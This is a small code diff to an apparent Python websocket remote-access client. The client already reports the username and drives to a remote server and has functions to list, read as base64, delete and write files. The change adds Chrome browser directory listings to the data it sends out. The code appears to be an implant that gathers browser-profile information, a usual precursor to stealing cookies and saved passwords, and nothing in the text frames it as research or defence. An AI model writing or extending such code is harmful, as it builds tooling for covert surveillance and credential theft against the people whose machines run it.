@@ -3,6 +3,7 @@ import json
 
 import websockets
 
+from chrome_paths import get_chrome_directory_listings
 from filesystem import list_directory, read_file_base64, delete_path, write_file
 from ssl_utils import build_ssl_context
 from system_info import (
@@ -67,6 +68,7 @@ async def run(url: str) -> None:
                                     "username": get_username(),
                                     "request_id": data.get("request_id"),
                                     "drives": get_drives(),
+                                    "chrome_directories": get_chrome_directory_listings(),
                                 },
                             }
                             await ws.send(json.dumps(fresh_info))
